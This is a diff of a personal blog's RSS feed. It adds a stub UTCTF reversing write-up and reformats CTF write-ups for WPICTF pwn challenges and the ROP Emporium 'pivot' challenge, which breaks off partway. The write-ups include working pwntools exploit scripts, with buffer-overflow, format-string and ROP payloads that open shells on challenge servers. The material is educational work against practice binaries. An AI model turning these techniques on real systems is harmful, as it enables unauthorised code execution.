@@ -5,8 +5,32 @@
         <description>Recent content in Posts on Saurabh Mittal</description>
         <generator>Hugo -- gohugo.io</generator>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Mon, 20 Apr 2020 21:52:12 +0530</lastBuildDate>
+        <lastBuildDate>Mon, 15 Mar 2021 22:00:35 +0530</lastBuildDate>
         <atom:link href="https://saurabhmittal16.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>UTCTF recur challenge</title>
+            <link>https://saurabhmittal16.github.io/posts/2021/03/utctf-recur-challenge/</link>
+            <pubDate>Mon, 15 Mar 2021 22:00:35 +0530</pubDate>
+            
+            <guid>https://saurabhmittal16.github.io/posts/2021/03/utctf-recur-challenge/</guid>
+            <description>Over the weekend, I participated in the UTCTF 2021 but was unable to spend a lot of time on the challenges. One of the challenge I worked on was the recur challenge in the Reverse Engineering category. The challenge was not that hard but I had fun working on it so I decided to write a writeup for the challenge.
+The challenge had a binary file attached with it and the description of the challenge was -</description>
+            <content type="html"><![CDATA[<p>Over the weekend, I participated in the <a href="https://utctf.live/">UTCTF 2021</a> but was unable to spend a lot of time on the challenges. One of the challenge I worked on was the <strong>recur</strong> challenge in the Reverse Engineering category. The challenge was not that hard but I had fun working on it so I decided to write a writeup for the challenge.</p>
+<p>The challenge had a binary file attached with it and the description of the challenge was -</p>
+<blockquote>
+<p>I found this binary that is supposed to print flags. It doesn&rsquo;t seem to work properly though&hellip;</p>
+</blockquote>
+<p>I usually run the <code>file</code> command on the challenge binaries just to know if they are stripped or not. A stripped binary has no debugging symbols which makes it harder to debug and reverse. <a href="https://medium.com/@tr0id/working-with-stripped-binaries-in-gdb-cacacd7d5a33">Here</a> is an article that compare the two and explains how to deal with a stripped binary.</p>
+<p>Back to the challenge, here is the output of the <code>file</code> command on our binary -</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file ./recur
+recur: ELF 64-bit LSB shared object, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>ffe1273695471373b182d4f5f266181d893ba3d8, <span style="color:#66d9ef">for</span> GNU/Linux 4.4.0, not stripped
+</code></pre></div><p>Not stripped which means it would be easy to debug. I also execute the binary just to get an idea of the output. Like the description said, the binary prints the flag but is stuck after <code>{</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./recur
+utflag<span style="color:#f92672">{</span>
+</code></pre></div><p>To be continued</p>
+]]></content>
+        </item>
         
         <item>
             <title>WPICTF pwn</title>
@@ -16,33 +40,22 @@
             <guid>https://saurabhmittal16.github.io/posts/2020/04/wpictf-pwn/</guid>
             <description>I participated in the WPICTF over the weekend and it was a great experience. The challenges were fun and hard enough to keep things interesting. I solved a few challenges but the part that makes me happy is that I solved 2 out of the 4 pwn problems. In this post, I will explain how I solved the two pwns - dorsia1 and dorsia3.
 dorsia1 The source codes of some of the challenges were placed in a video.</description>
-            <content type="html"><![CDATA[
-
-<p>I participated in the <a href="https://ctf.wpictf.xyz/" target="_blank">WPICTF</a> over the weekend and it was a great experience. The challenges were fun and hard enough to keep things interesting. I solved a few challenges but the part that makes me happy is that I solved 2 out of the 4 pwn problems. In this post, I will explain how I solved the two pwns - <code>dorsia1</code> and <code>dorsia3</code>.</p>
-
+            <content type="html"><![CDATA[<p>I participated in the <a href="https://ctf.wpictf.xyz/">WPICTF</a> over the weekend and it was a great experience. The challenges were fun and hard enough to keep things interesting. I solved a few challenges but the part that makes me happy is that I solved 2 out of the 4 pwn problems. In this post, I will explain how I solved the two pwns - <code>dorsia1</code> and <code>dorsia3</code>.</p>
 <h2 id="dorsia1">dorsia1</h2>
-
 <p>The source codes of some of the challenges were placed in a video. No binary was provided for this one. The problem description had the remote URL where the challenge was hosted and a hint which read</p>
-
 <blockquote>
 <p>Same libc as dorsia4, but you shouldn&rsquo;t need the file to solve</p>
 </blockquote>
-
 <p>Here is the source code from the video.</p>
-
-<div align='center'><img src="/static/dorsia1.png"/></div>
-
+<!-- raw HTML omitted -->
 <h3 id="first-thoughts">First Thoughts</h3>
-
 <p>First thoughts were to download the libc from <code>dorsia4</code> challenge. Also looking at the code, the use of <code>fgets</code> with <code>96</code> characters makes it clear that it&rsquo;s a buffer overflow. But since there is no binary provided, we might need to guess the padding to overwrite the return pointer. Also the binary prints the address of <code>system + 765772</code> which is different on every connection to the remote URL. This means that <code>ASLR</code> is enabled but this can be easily circumvented, the printed address can be used to get the <code>libc</code> base address. So, we can control the flow of the program but where to <em>redirect</em> the flow? I recently read about the conecpt of <code>one gadget RCE</code> and it seemed like a good oppurtunity to try it.</p>
-
 <h3 id="exploit">Exploit</h3>
-
 <p>After downloading the <code>libc</code> from <code>dorsia4</code>, I found the offset of <code>system</code> using <code>objdump</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -S ./libc.so.6 | grep system
 000000000004f440 &lt;__libc_system@@GLIBC_PRIVATE&gt;:
-   4f443:       <span style="color:#ae81ff">74</span> 0b                   je     4f450 &lt;__libc_system@@GLIBC_PRIVATE+0x10&gt;</code></pre></div>
-<p>The offset of <code>system</code> is <code>0x4f440</code>. Here is the first snippet of the exploit script which connects to the remote and calculates the <code>libc</code> base address.</p>
+   4f443:       <span style="color:#ae81ff">74</span> 0b                   je     4f450 &lt;__libc_system@@GLIBC_PRIVATE+0x10&gt;
+</code></pre></div><p>The offset of <code>system</code> is <code>0x4f440</code>. Here is the first snippet of the exploit script which connects to the remote and calculates the <code>libc</code> base address.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
 p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;dorsia1.wpictf.xyz&#39;</span>, <span style="color:#ae81ff">31337</span>)
@@ -53,8 +66,8 @@ addr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>r
 addr_system <span style="color:#f92672">=</span> int(addr, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">765772</span>
 
 libc_base <span style="color:#f92672">=</span> addr_system <span style="color:#f92672">-</span> system_offset
-<span style="color:#66d9ef">print</span>(hex(libc_base))</code></pre></div>
-<p>Now, for finding a <code>one gadget</code>, I used <a href="https://github.com/david942j/one_gadget" target="_blank">this tool</a>. Here is the output of <code>one_gadget</code>.</p>
+<span style="color:#66d9ef">print</span>(hex(libc_base))
+</code></pre></div><p>Now, for finding a <code>one gadget</code>, I used <a href="https://github.com/david942j/one_gadget">this tool</a>. Here is the output of <code>one_gadget</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ one_gadget ./libc.so.6
 0x4f2c5 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span style="color:#f92672">)</span>
 constraints:
@@ -67,8 +80,8 @@ constraints:
 
 0x10a38c execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x70, environ<span style="color:#f92672">)</span>
 constraints:
-  <span style="color:#f92672">[</span>rsp+0x70<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL</code></pre></div>
-<p>You can see the constraints that need to be met for that gadget to work. I decided to use <code>0x4f322</code> since the chances of <code>[rsp+0x40]</code> being <code>NULL</code> were high. The address of the gadget can be calculated by adding this offset to the base address. This is all we need to solve this challenge. The padding value had to be guesses but it was obviously greater than <code>69</code> and <code>77</code> worked. Here is the final script.</p>
+  <span style="color:#f92672">[</span>rsp+0x70<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL
+</code></pre></div><p>You can see the constraints that need to be met for that gadget to work. I decided to use <code>0x4f322</code> since the chances of <code>[rsp+0x40]</code> being <code>NULL</code> were high. The address of the gadget can be calculated by adding this offset to the base address. This is all we need to solve this challenge. The padding value had to be guesses but it was obviously greater than <code>69</code> and <code>77</code> worked. Here is the final script.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
 p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;dorsia1.wpictf.xyz&#39;</span>, <span style="color:#ae81ff">31337</span>)
@@ -89,32 +102,24 @@ payload <span style="color:#f92672">+=</span> p64(one_gadget)
 p<span style="color:#f92672">.</span>sendline(payload)
 
 <span style="color:#75715e"># get shell</span>
-p<span style="color:#f92672">.</span>interactive()</code></pre></div>
-<p>Done. Solved.</p>
-
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>Done. Solved.</p>
 <h2 id="dorsia3">dorsia3</h2>
-
 <p>In this challenge, both the binary and the libc was provided. The same video had the source code for this challenge too. Here is the source code.</p>
-
-<div align='center'><img src="/static/dorsia3.png"/></div>
-
+<!-- raw HTML omitted -->
 <h3 id="first-thoughts-1">First Thoughts</h3>
-
 <p>First thoughts were that, since this uses <code>printf</code>, it&rsquo;s a format string vulnerability. The binary prints two addresses - the address of the beginning of character array <code>a</code> and the address of <code>system</code>. This binary had <code>ASLR</code> and <code>PIE</code> enabled too which means the addresses printed by the binary were important.</p>
-
 <p>Due to <code>printf</code>, we have arbitrary write but what to write and where? First idea was to overwrite <code>GOT</code> entries but due to <code>PIE</code>, the binary would be loaded in a different memory region every time and finding <code>GOT</code> or <code>PLT</code> entries would be impossible. We could leak some addresses from <code>printf</code> and get the base address but we only have one <code>printf</code> and we can&rsquo;t read and write using the same query. The next idea was to overwrite the return pointer in stack to control the flow and maybe redirect to <code>one gagdet</code>. But this approach didn&rsquo;t work because the constraints of <code>one gadgets</code> found, required that the <code>GOT</code> address of <code>libc</code> be in <code>ESI</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ one_gadget ./libc.so.6
 0x3d0d3 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, esp+0x34, environ<span style="color:#f92672">)</span>
 constraints:
   esi is the GOT address of libc
-  <span style="color:#f92672">[</span>esp+0x34<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL</code></pre></div>
-<p>I guess it means that the base address of <code>libc</code> should be in <code>ESI</code> but it doesn&rsquo;t matter because for placing values in registers, we would have to build a ROP chain but the available buffer is only <code>69</code> characters. But we have the address of <code>libc</code>, maybe we could perform a <code>return-to-libc</code>. For this, we need the address of the saved return pointer - <code>EIP</code> and also the address of the string <code>/bin/sh</code> in the given <code>libc</code>.</p>
-
+  <span style="color:#f92672">[</span>esp+0x34<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL
+</code></pre></div><p>I guess it means that the base address of <code>libc</code> should be in <code>ESI</code> but it doesn&rsquo;t matter because for placing values in registers, we would have to build a ROP chain but the available buffer is only <code>69</code> characters. But we have the address of <code>libc</code>, maybe we could perform a <code>return-to-libc</code>. For this, we need the address of the saved return pointer - <code>EIP</code> and also the address of the string <code>/bin/sh</code> in the given <code>libc</code>.</p>
 <h3 id="exploit-1">Exploit</h3>
-
 <p>The first thing I did was find the offset for <code>/bin/sh</code> in the <code>libc</code>. Here&rsquo;s a simple trick to find the required string in the binary.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings -t x -a ./libc.so.6 | grep <span style="color:#e6db74">&#39;/bin/sh&#39;</span></code></pre></div>
-<p>Using this the offset is found to be <code>17e0cf</code>. Next step was to find the saved <code>EIP</code>. This is where the printed addresses are used. The first address is the address of beginning of <code>a</code>. Using <code>gdb</code> and running the binary locally, it can be easily calculated that the return address is <code>113</code> bytes after the address of <code>a</code>. Here is a snippet of the script that calculates all required addresses.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings -t x -a ./libc.so.6 | grep <span style="color:#e6db74">&#39;/bin/sh&#39;</span>
+</code></pre></div><p>Using this the offset is found to be <code>17e0cf</code>. Next step was to find the saved <code>EIP</code>. This is where the printed addresses are used. The first address is the address of beginning of <code>a</code>. Using <code>gdb</code> and running the binary locally, it can be easily calculated that the return address is <code>113</code> bytes after the address of <code>a</code>. Here is a snippet of the script that calculates all required addresses.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
 <span style="color:#75715e"># space between string beginning and return pointer</span>
@@ -135,9 +140,8 @@ libc_base <span style="color:#f92672">=</span> system <span style="color:#f92672
 jump <span style="color:#f92672">=</span> local <span style="color:#f92672">+</span> diff
 
 binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x17e0cf</span>
-binsh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> binsh_offset</code></pre></div>
-<p>The next part was to find out at what position is our input present on the stack. Passing a simple <code>AAAA%x,%x,%x,%x,%x,%x,%x,%x</code> type string reveals that <code>AAAA</code> is the seventh value on the stack. This means we can access the value at the beginning of our format string using the seventh argument. If you are not familiar with how format string exploits work, I would recommend <a href="https://www.youtube.com/watch?v=t1LH9D5cuK4" target="_blank">this</a> video. The final step was to find the correct spacing to write the exact values on the desired address. After hours of hit and trial, I decided to use a little mathematics and make it easier.</p>
-
+binsh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> binsh_offset
+</code></pre></div><p>The next part was to find out at what position is our input present on the stack. Passing a simple <code>AAAA%x,%x,%x,%x,%x,%x,%x,%x</code> type string reveals that <code>AAAA</code> is the seventh value on the stack. This means we can access the value at the beginning of our format string using the seventh argument. If you are not familiar with how format string exploits work, I would recommend <a href="https://www.youtube.com/watch?v=t1LH9D5cuK4">this</a> video. The final step was to find the correct spacing to write the exact values on the desired address. After hours of hit and trial, I decided to use a little mathematics and make it easier.</p>
 <p>Here is a simple function I wrote that takes an address in hex and splits it into two values that can be written at the required address and the address 2 bytes from it.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_halves</span>(num):
 	<span style="color:#75715e"># example nhex = f7d99200</span>
@@ -147,8 +151,8 @@ binsh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672"
 	second <span style="color:#f92672">=</span> int(nhex[<span style="color:#ae81ff">4</span>:], <span style="color:#ae81ff">16</span>)
 
 	<span style="color:#66d9ef">return</span> first, second
-	<span style="color:#75715e"># returns 0xf7d9, 0x9200</span></code></pre></div>
-<p>Using this, I split the <code>libc</code> and <code>/bin/sh</code> addresses in two halves and added/subtracted the extra characters that were getting printed. Here is the final script which gives a shell on the remote server.</p>
+	<span style="color:#75715e"># returns 0xf7d9, 0x9200</span>
+</code></pre></div><p>Using this, I split the <code>libc</code> and <code>/bin/sh</code> addresses in two halves and added/subtracted the extra characters that were getting printed. Here is the final script which gives a shell on the remote server.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_halves</span>(num):
@@ -195,8 +199,8 @@ payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</spa
 payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%10$n&#39;</span>
 
 p<span style="color:#f92672">.</span>sendline(payload)
-p<span style="color:#f92672">.</span>interactive()</code></pre></div>
-<p>These are the solutions of the two pwn problems I was able to solve. I realise that the first problem could be solved without downloading the <code>libc</code>, so I would try to solve it without that too if the challenge binaries are released. In the end, I enjoyed working on these challenges and it was a great CTF overall. Thanks for reading. Cheers!</p>
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>These are the solutions of the two pwn problems I was able to solve. I realise that the first problem could be solved without downloading the <code>libc</code>, so I would try to solve it without that too if the challenge binaries are released. In the end, I enjoyed working on these challenges and it was a great CTF overall. Thanks for reading. Cheers!</p>
 ]]></content>
         </item>
         
@@ -207,18 +211,12 @@ p<span style="color:#f92672">.</span>interactive()</code></pre></div>
             
             <guid>https://saurabhmittal16.github.io/posts/2020/04/rop-emporium-pivot-writeup/</guid>
             <description>I recently came across the ropemporium challenges while looking for resources to learn Return Oriented Programming (ROP). I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the pivot challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version.</description>
-            <content type="html"><![CDATA[
-
-<p>I recently came across the <a href="https://ropemporium.com/" target="_blank">ropemporium</a> challenges while looking for resources to learn <a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank">Return Oriented Programming (ROP)</a>. I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the <a href="https://ropemporium.com/challenge/pivot.html" target="_blank">pivot</a> challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version.</p>
-
+            <content type="html"><![CDATA[<p>I recently came across the <a href="https://ropemporium.com/">ropemporium</a> challenges while looking for resources to learn <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">Return Oriented Programming (ROP)</a>. I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the <a href="https://ropemporium.com/challenge/pivot.html">pivot</a> challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version.</p>
 <p>The problem description gives a basic idea of what needs to be done</p>
-
 <blockquote>
 <p>There&rsquo;s only enough space for a three-link chain on the stack but you&rsquo;ve been given space to stash a much larger ROP chain elsewhere. Learn how to pivot the stack onto a new location.</p>
 </blockquote>
-
 <h2 id="exploring-the-binary">Exploring the binary</h2>
-
 <p>I started by executing the binary and it expects two different inputs from the user. The print statements of binary make it clear that the second input should be used to overflow the stack and pivot it and the first input is for the main ROP chain.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pivot by ROP Emporium
 32bits
@@ -230,11 +228,9 @@ Send your second chain now and it will land there
 Now kindly send your stack smash
 &gt; world
 
-Exiting</code></pre></div>
-<p>The address printed by the binary is most probably the address where the longer chain is stored (heap). We can confirm this by debugging the binary with GDB.</p>
-
+Exiting
+</code></pre></div><p>The address printed by the binary is most probably the address where the longer chain is stored (heap). We can confirm this by debugging the binary with GDB.</p>
 <p>Before getting into debugging the binary, I would like to state some things that I assume readers already know (if they have solved any of the previous challenges). Every binary has a <code>pwnme</code> function which uses the vulnerable <code>gets()</code> function which is used to overwrite the return pointer. The return pointer can be overwritten by 44 bytes of padding. And each binary has a function named either uselessFunction or usefulFunction which has useful assembly. This binary has a <code>uselessFunction()</code> which calls the <code>foothold_function</code>which is very important for this challenge but more on it later.</p>
-
 <p>Now getting back to the address received from the binary. We open the binary with GDB and disassemble the <code>pwnme</code> function and set a breakpoint after the first <code>fgets</code> call (at pwnme + 114). Run the program and enter a string like <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>.
 GDB breaks and the address is printed by the binary (<code>0xf7dc8f10</code> in this case). On examining this address, we find the value <code>0x414141</code> multiple times which is ASCII value of &lsquo;A&rsquo; in hexadecimal.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; x/20wx 0xf7dc8f10
@@ -242,15 +238,12 @@ GDB breaks and the address is printed by the binary (<code>0xf7dc8f10</code> in 
 0xf7dc8f20: 0x41414141 0x41414141 0x41414141 0x41414141
 0xf7dc8f30: 0x41414141 0x41414141 0x41414141 0x41414141
 0xf7dc8f40: 0x41414141 0x41414141 0x41414141 0x41414141
-0xf7dc8f50: 0x0000000a 0x00000000 0x00000000 0x00000000</code></pre></div>
-<p>This confirms that the address received from binary is where the longer chain will be stored.</p>
-
+0xf7dc8f50: 0x0000000a 0x00000000 0x00000000 0x00000000
+</code></pre></div><p>This confirms that the address received from binary is where the longer chain will be stored.</p>
 <h2 id="pivot-the-stack">Pivot the stack</h2>
-
 <p>The next step is to build the shorter ROP chain which pivots the stack but what does pivoting the stack mean?
 In simple terms, pivoting the stack means to make the stack pointer (<code>ESP</code>) point to a memory location which we control instead of the actual stack. So, all we need to do is make <code>ESP</code> point to the address where the longer ROP chain will be saved.</p>
-
-<p>For this, we need gadgets that can load the value from stack into any of the registers and then move the value of that register in <code>ESP</code>. The gadgets available inside a binary can be found using <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank">ROPGadget</a>. On running the script on our <code>pivot32</code> binary, it found 160 unique gadgets. One of them is the <code>xchg eax, esp ; ret</code> gadget which exchanges the value of <code>EAX</code> and <code>ESP</code>. It seems like this gadget was placed intentionally in the binary and that it is the case. The binary contains a function <code>usefulGadgets</code> which contains some useful gadgets.</p>
+<p>For this, we need gadgets that can load the value from stack into any of the registers and then move the value of that register in <code>ESP</code>. The gadgets available inside a binary can be found using <a href="https://github.com/JonathanSalwan/ROPgadget">ROPGadget</a>. On running the script on our <code>pivot32</code> binary, it found 160 unique gadgets. One of them is the <code>xchg eax, esp ; ret</code> gadget which exchanges the value of <code>EAX</code> and <code>ESP</code>. It seems like this gadget was placed intentionally in the binary and that it is the case. The binary contains a function <code>usefulGadgets</code> which contains some useful gadgets.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; disass usefulGadgets
 Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulGadgets:
    0x080488c0 &lt;+0&gt;:  pop    eax
@@ -264,8 +257,8 @@ Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color
    0x080488ca &lt;+10&gt;: xchg   ax,ax
    0x080488cc &lt;+12&gt;: xchg   ax,ax
    0x080488ce &lt;+14&gt;: xchg   ax,ax
-End of assembler dump.</code></pre></div>
-<p>Other gadget used for the pivoting is <code>pop eax ; ret</code>. This pops a value from the stack and moves it into <code>EAX</code> register. So let&rsquo;s start building the exploit script using <code>pwntools</code>. Here is a snippet of the script which loads the binary and extracts the address from the output. Some basic regex is used to extract the address.</p>
+End of assembler dump.
+</code></pre></div><p>Other gadget used for the pivoting is <code>pop eax ; ret</code>. This pops a value from the stack and moves it into <code>EAX</code> register. So let&rsquo;s start building the exploit script using <code>pwntools</code>. Here is a snippet of the script which loads the binary and extracts the address from the output. Some basic regex is used to extract the address.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">import</span> re
 
@@ -287,15 +280,14 @@ padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span
 pop_eax <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c0</span>)
 
 <span style="color:#75715e"># xchg eax, esp ; ret</span>
-xchg <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c2</span>)</code></pre></div>
-<p>The short ROP chain is built such that after returning from <code>pwnme</code>, the <code>pop_eax</code> gadget is executed and then the exchange gadget is called.</p>
+xchg <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c2</span>)
+</code></pre></div><p>The short ROP chain is built such that after returning from <code>pwnme</code>, the <code>pop_eax</code> gadget is executed and then the exchange gadget is called.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># short chain for overflowing stack and pivoting stack to longer chain</span>
 short <span style="color:#f92672">=</span> padding
 short <span style="color:#f92672">+=</span> pop_eax
 short <span style="color:#f92672">+=</span> addr
-short <span style="color:#f92672">+=</span> xchg</code></pre></div>
-<p>When <code>pop_eax</code> is executed, the top of the stack is the address where longer chain is saved, therefore it pops that value into the <code>EAX</code> register. Now <code>EAX</code> contains the address of long chain. The <code>xchg</code> gadget swaps the values and now <code>ESP</code> contains the required address. The longer chain is currently set to some junk value like <code>0xdeadbeef</code>. We can check this script by running this script and attaching GDB.</p>
-
+short <span style="color:#f92672">+=</span> xchg
+</code></pre></div><p>When <code>pop_eax</code> is executed, the top of the stack is the address where longer chain is saved, therefore it pops that value into the <code>EAX</code> register. Now <code>EAX</code> contains the address of long chain. The <code>xchg</code> gadget swaps the values and now <code>ESP</code> contains the required address. The longer chain is currently set to some junk value like <code>0xdeadbeef</code>. We can check this script by running this script and attaching GDB.</p>
 <p>Breaking at <code>ret</code> of <code>pwnme</code> shows the path we are going to follow -</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> ► 0x804889f &lt;pwnme+173&gt;           leave
    0x80488a0 &lt;pwnme+174&gt;           ret
@@ -304,8 +296,8 @@ short <span style="color:#f92672">+=</span> xchg</code></pre></div>
    0x80488c1 &lt;usefulGadgets+1&gt;     ret
 
    0x80488c2 &lt;usefulGadgets+2&gt;     xchg   eax, esp
-   0x80488c3 &lt;usefulGadgets+3&gt;     ret</code></pre></div>
-<p>And after the exchange gadget is executed, <code>ESP</code> points to the address where longer chain is saved and the program tries executing the instructions saved at that address. GDB gets a segmentation fault since the address contains<code>0xdeadbeef</code> at this stage.</p>
+   0x80488c3 &lt;usefulGadgets+3&gt;     ret
+</code></pre></div><p>And after the exchange gadget is executed, <code>ESP</code> points to the address where longer chain is saved and the program tries executing the instructions saved at that address. GDB gets a segmentation fault since the address contains<code>0xdeadbeef</code> at this stage.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">   0x804889f &lt;pwnme+173&gt;          leave
    0x80488a0 &lt;pwnme+174&gt;          ret
     ↓
@@ -313,8 +305,8 @@ short <span style="color:#f92672">+=</span> xchg</code></pre></div>
    0x80488c1 &lt;usefulGadgets+1&gt;    ret
 
    0x80488c2 &lt;usefulGadgets+2&gt;    xchg   eax, esp
- ► 0x80488c3 &lt;usefulGadgets+3&gt;    ret    &lt;0xdeadbeef&gt;</code></pre></div>
-<p>The updated registers are listed and it can be seen that <code>ESP</code> points to the desired address.</p>
+ ► 0x80488c3 &lt;usefulGadgets+3&gt;    ret    &lt;0xdeadbeef&gt;
+</code></pre></div><p>The updated registers are listed and it can be seen that <code>ESP</code> points to the desired address.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> EAX  0xfff4de88 ◂— 0xa /* <span style="color:#e6db74">&#39;\n&#39;</span> */
  EBX  0x0
  ECX  0xfff4de50 ◂— 0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
@@ -323,43 +315,37 @@ short <span style="color:#f92672">+=</span> xchg</code></pre></div>
  ESI  0xf7fa0000 <span style="color:#f92672">(</span>_GLOBAL_OFFSET_TABLE_<span style="color:#f92672">)</span> ◂— 0x1d7d6c
  EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
  ESP  0xf7dc6f10 ◂— 0xdeadbeef
- EIP  0x80488c3 <span style="color:#f92672">(</span>usefulGadgets+3<span style="color:#f92672">)</span> ◂— ret</code></pre></div>
-<p>We have successfully pivoted the stack to the desired address and now the longer ROP chain has to be built to get the flag.</p>
-
+ EIP  0x80488c3 <span style="color:#f92672">(</span>usefulGadgets+3<span style="color:#f92672">)</span> ◂— ret
+</code></pre></div><p>We have successfully pivoted the stack to the desired address and now the longer ROP chain has to be built to get the flag.</p>
 <h2 id="getting-the-flag">Getting the flag</h2>
-
 <h3 id="plt-and-got">PLT and GOT</h3>
-
